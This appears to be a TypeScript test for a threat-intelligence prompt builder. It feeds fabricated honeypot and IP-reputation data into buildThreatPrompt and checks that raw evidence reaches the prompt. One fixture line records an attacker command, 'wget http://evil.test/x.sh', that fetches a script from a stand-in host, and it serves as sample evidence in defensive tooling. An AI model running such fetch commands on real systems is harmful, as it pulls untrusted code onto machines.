import assert from "node:assert"
import { buildThreatPrompt } from "./threat-prompt"
import type { ThreatDetail } from "@/lib/api"
import type { IpEnrichment } from "@/lib/ip-enrichment"

const threat = {
  ip: "1.2.3.4",
  protocolsSeen: ["ssh"],
  crossProtocol: false,
  ssh: { sessions: 2, authAttempts: 9, loginSuccess: true },
  web: null,
  protocols: null,
  portScans: { events: 5, uniquePorts: 2, ports: [23, 2323] },
  risk: {
    score: 91,
    level: "CRITICAL",
    breakdown: { ssh: 20, web: 0, protocols: 0, commands: 30, crossProto: 0, evidence: 41 },
    topFactors: ["SSH login successful"],
    commandCategories: { recon: ["uname -a"] },
  },
  classifiedCommands: [{ command: "wget http://evil.test/x.sh", ts: "2026-08-01T00:00:00Z", category: "download" }],
  protocolCommands: [],
} as unknown as ThreatDetail

const enrichment = {
  ip: "1.2.3.4",
  abuseipdb: {
    abuseConfidenceScore: 100, totalReports: 1858, numDistinctUsers: 526,
    lastReportedAt: "2026-08-03T00:00:00Z", isp: "DataWagon LLC", domain: "datawagon.com",
    hostnames: ["glomtom.asphaltum.net"], usageType: "Data Center", countryCode: "US",
    countryName: "United States", isVpn: false, isTor: false, isWhitelisted: false,
    reports: [{ reportedAt: "2026-08-03T00:00:00Z", comment: "Web app attack: scanning for .env", categories: [21], reporterCountryCode: "ES", reporterCountryName: "Spain" }],
  },
  ipinfo: null,
  spectraAnalyze: null,
  virustotal: {
    asn: 27176, as_owner: "DataWagon LLC", network: "104.192.0.0/22", country: "US",
    continent: "NA", regional_internet_registry: "ARIN", last_analysis_date: null,
    last_analysis_stats: { malicious: 13, suspicious: 3, undetected: 30, harmless: 45, timeout: 0 },
    last_analysis_results: { Fortinet: { category: "malicious", engine_name: "Fortinet", engine_version: null, engine_update: null, method: "blacklist", result: "malware" } },
    reputation: -2, total_votes: { harmless: 0, malicious: 2 }, tags: [],
    jarm: "2ad2ad0002ad2ad22c42d42d", last_https_certificate: null,
    last_https_certificate_date: null, whois: null, whois_date: null, last_modification_date: null,
  },
  cachedAt: "2026-08-03T00:00:00Z",
} as unknown as IpEnrichment

const prompt = buildThreatPrompt("1.2.3.4", threat, enrichment, [
  { alertKey: "cred_reuse", level: "high", title: "Credential reuse", description: "same creds on ftp+ssh", createdAt: "2026-08-02T00:00:00Z" },
])

// The whole point of the rewrite: the model must see the evidence, not a summary.
for (const needle of [
  "wget http://evil.test/x.sh",   // raw command sequence
  "scanning for .env",             // AbuseIPDB reporter comments
  "Web App Attack",                // decoded abuse categories
  "glomtom.asphaltum.net",         // hostnames
  "Fortinet=malware",              // which engines flag it, not just a count
  "2ad2ad0002ad2ad22c42d42d",      // JARM
  "104.192.0.0/22",                // network range
  "Credential reuse",              // correlation alerts
  "Puertos unicos sondeados: 2",   // port scans (was missing entirely before)
  "web",                           // web-search instructions
]) {
  assert.ok(prompt.includes(needle), `prompt missing: ${needle}`)
}

// No enrichment at all must not throw or leak "undefined" into the prompt.
const bare = buildThreatPrompt("9.9.9.9", threat, null, [])
assert.ok(bare.includes("AbuseIPDB: sin datos"))
assert.ok(!bare.includes("undefined"))

console.log("threat-prompt ok")
